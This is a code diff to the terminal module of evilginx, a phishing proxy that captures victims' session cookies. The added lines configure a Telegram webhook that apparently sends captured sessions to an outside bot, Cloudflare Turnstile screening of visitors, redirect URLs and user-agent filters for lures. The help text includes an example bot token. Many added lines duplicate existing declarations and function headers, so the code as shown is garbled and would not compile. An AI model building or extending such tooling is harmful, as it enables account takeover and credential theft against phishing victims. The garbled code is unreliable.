@@ -194,6 +194,8 @@ func (t *Terminal) handleConfig(args []string) error {
 
 		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure"}
 		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure}
+		keys := []string{"domain", "ipv4", "https_port", "dns_port", "redirect_url", "webhook_telegram", "turnstile_key"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.Ipv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.RedirectUrl, t.cfg.general.WebhookTelegram, t.cfg.general.TurnstileKey}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -207,6 +209,13 @@ func (t *Terminal) handleConfig(args []string) error {
 			t.cfg.SetServerExternalIP(args[1])
 			return nil
 		case "unauth_url":
+			t.cfg.SetServerIP(args[1])
+			return nil
+		case "webhook_telegram":
+			t.cfg.SetWebhookTelegram(args[1])
+			log.Warning("you need to restart evilginx after this change")
+			return nil
+		case "redirect_url":
 			if len(args[1]) > 0 {
 				_, err := url.ParseRequestURI(args[1])
 				if err != nil {
@@ -268,6 +277,11 @@ func (t *Terminal) handleConfig(args []string) error {
 					return nil
 				}
 			}
+			t.cfg.SetRedirectUrl(args[1])
+			return nil
+		case "turnstile_key":
+			t.cfg.SetTurnstilekey(args[1])
+			return nil
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
@@ -482,6 +496,7 @@ func (t *Terminal) handleSessions(args []string) error {
 					}
 					if len(s.CookieTokens) > 0 {
 						json_tokens := t.cookieTokensToJSON(s.CookieTokens)
+						json_tokens := t.cookieTokensToJSON(pl, s.CookieTokens)
 						log.Printf("[ %s ]\n%s\n\n", lyellow.Sprint("cookies"), json_tokens)
 					}
 				}
@@ -1173,6 +1188,16 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
 	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
 	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")
+func (t *Terminal) createHelp() {
+	h, _ := NewHelp()
+	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
+		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4"), readline.PcItem("redirect_url"), readline.PcItem("webhook_telegram"), readline.PcItem("turnstile_key")))
+	h.AddSubCommand("config", nil, "", "show all configuration variables")
+	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
+	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ip_address>", "set ipv4 external address of the current server")
+	h.AddSubCommand("config", []string{"redirect_url"}, "redirect_url <url>", "change the url where all unauthorized requests will be redirected to (phishing urls will need to be regenerated)")
+	h.AddSubCommand("config", []string{"webhook_telegram"}, "webhook_telegram <bot_token>/<chat_id>", "telegram webhook config in format: bot_token/chat_id (example: 4101656209:AAFJeahG73axTthuvh4wW4gg6Wtnhe51yVw/1721242916)")
+	h.AddSubCommand("config", []string{"turnstile_key"}, "turnstile_key <sitekey>:<secretkey>", "change the site key for Cloudflare's Turnstile CAPTCHA")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
@@ -1191,6 +1216,7 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter))))
+			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter))))
 	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
 	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
 	h.AddSubCommand("phishlets", []string{"create"}, "create <phishlet> <child_name> <key1=value1> <key2=value2>", "create child phishlet from a template phishlet with custom parameters")
@@ -1212,6 +1238,7 @@ func (t *Terminal) createHelp() {
 
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
 		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
+		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"),
 			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
 			readline.PcItem("delete", readline.PcItem("all"))))
 
@@ -1256,6 +1283,7 @@ func (t *Terminal) createHelp() {
 }
 
 func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
+func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.CookieToken) string {
 	type Cookie struct {
 		Path           string `json:"path"`
 		Domain         string `json:"domain"`
@@ -1300,6 +1328,7 @@ func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.Coo
 }
 
 func (t *Terminal) tokensToJSON(tokens map[string]string) string {
+func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]string) string {
 	var ret string
 	white := color.New(color.FgHiWhite)
 	for k, v := range tokens {
@@ -1314,6 +1343,8 @@ func (t *Terminal) checkStatus() {
 	}
 	if t.cfg.GetServerExternalIP() == "" {
 		log.Warning("server external ip not set! type: config ipv4 external <external_ipv4_address>")
+	if t.cfg.GetServerIP() == "" {
+		log.Warning("server ip not set! type: config ipv4 <ip_address>")
 	}
 }
 
@@ -1343,6 +1374,21 @@ func (t *Terminal) manageCertificates(verbose bool) {
 				log.Error("run 'test-certs' command to retry")
 				return
 			}
+		hosts := t.p.cfg.GetActiveHostnames("")
+		//wc_host := t.p.cfg.GetWildcardHostname()
+		//hosts := []string{wc_host}
+		//hosts = append(hosts, t.p.cfg.GetActiveHostnames("")...)
+		if verbose {
+			log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
+		}
+		err := t.p.crt_db.setManagedSync(hosts, 60*time.Second)
+		if err != nil {
+			log.Error("failed to set up TLS certificates: %s", err)
+			log.Error("run 'test-certs' command to retry")
+			return
+		}
+		if verbose {
+			log.Info("successfully set up all TLS certificates")
 		}
 	}
 }
@@ -1358,6 +1404,7 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 	logray := color.New(color.FgHiBlack)
 	n := 0
 	cols := []string{"phishlet", "status", "visibility", "hostname", "unauth_url"}
+	cols := []string{"phishlet", "status", "visibility", "hostname"}
 	var rows [][]string
 
 	var pnames []string
@@ -1405,6 +1452,11 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 				return AsRows(keys, vals)
 			} else if site == "" {
 				rows = append(rows, []string{hiblue.Sprint(s), status, hidden_status, cyan.Sprint(domain), logreen.Sprint(unauth_url)})
+				keys := []string{"phishlet", "parent", "status", "visibility", "hostname", "params"}
+				vals := []string{hiblue.Sprint(s), blue.Sprint(pl.ParentName), status, hidden_status, cyan.Sprint(domain), logray.Sprint(param_names)}
+				return AsRows(keys, vals)
+			} else if site == "" {
+				rows = append(rows, []string{hiblue.Sprint(s), status, hidden_status, cyan.Sprint(domain)})
 			}
 		}
 	}
@@ -1424,6 +1476,8 @@ func (t *Terminal) sprintIsEnabled(enabled bool) string {
 
 func (t *Terminal) sprintLures() string {
 	higreen := color.New(color.FgHiGreen)
+	green := color.New(color.FgGreen)
+	//hired := color.New(color.FgHiRed)
 	hiblue := color.New(color.FgHiBlue)
 	yellow := color.New(color.FgYellow)
 	cyan := color.New(color.FgCyan)
@@ -1431,6 +1485,7 @@ func (t *Terminal) sprintLures() string {
 	white := color.New(color.FgHiWhite)
 	//n := 0
 	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "redirect_url", "paused", "og"}
+	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "ua_filter", "redirect_url", "og"}
 	var rows [][]string
 	for n, l := range t.cfg.lures {
 		var og string
@@ -1458,6 +1513,7 @@ func (t *Terminal) sprintLures() string {
 		var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))
 
 		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), yellow.Sprint(l.RedirectUrl), s_paused, og})
+		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), og})
 	}
 	return AsTable(cols, rows)
 }
